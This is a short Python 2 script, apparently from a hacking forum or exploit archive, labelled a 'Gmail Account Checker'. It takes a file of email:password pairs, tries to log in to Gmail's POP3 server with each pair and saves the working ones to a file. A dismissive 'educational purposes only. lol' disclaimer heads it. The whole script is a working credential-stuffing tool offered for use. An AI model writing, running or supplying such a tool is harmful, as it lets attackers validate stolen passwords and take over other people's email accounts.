#!/usr/bin/env python 
 
# Gmail Account Checker 
# 10n1z3d[at]w[dot]cn 
# This software is for educational purposes only. lol 
 
import sys, poplib 
 
def printHelp(): 
    print '\nUsage: ./gmailcheck.py <emaillist>' 
    print 'Example: ./gmailcheck.py emails.txt' 
    print '\nNote: The accounts must be in the following format: user@gmail.com:password\n' 
 
 
print ''' 
\t _____           _ _ 
\t|   __|_____ ___|_| | 
\t|  |  |     | .'| | | 
\t|_____|_|_|_|__,|_|_| 
\t   Account Checker 
\t 10n1z3d[at]w[dot]cn 
''' 
 
if len(sys.argv) != 2: 
    printHelp() 
    exit(1) 
 
#Change these if needed. 
SAVEFILE = 'valid_accounts.txt' 
HOST = 'pop.gmail.com' 
PORT = 995 
 
# Do not change anything below. 
maillist = sys.argv[1] 
valid = [] 
currline = 0 
 
try: 
    handle = open(maillist) 
except: 
    print '\n[-] Could not open the accounts file. Check the file path and try again.' 
    print '\n[-] Quitting ...' 
    exit(1) 
 
for line in handle: 
    currline += 1 
 
    try: 
        email = line.split(':')[0] 
        password = line.split(':')[1].replace('\n', '') 
    except: 
        print '\n[-] Erroneous account format at line %d.' % currline 
        print '[!] Accounts must be in the following format: user@gmail.com:password' 
        print '\n[-] Quitting ...' 
        exit(1) 
 
    try: 
        pop = poplib.POP3_SSL(HOST, PORT) 
        pop.user(email) 
        pop.pass_(password) 
        valid.append(email + ':' + password) 
        print '[+] Checking: %s <%s> -> Valid!' % (email, password) 
        pop.quit() 
    except: 
        print '[+] Checking: %s <%s> -> Invalid!' % (email, password) 
        pass 
 
handle.close() 
print '\n[+] Total Valid: %s' % len(valid) 
 
if len(valid) > 0: 
    save = open(SAVEFILE, 'a') 
 
    for email in valid: 
        save.write(email + '\n') 
 
    save.close() 
 
    print '[+] The valid accounts are saved in "%s".' % SAVEFILE 
 
print '\n[+] Done.\n'
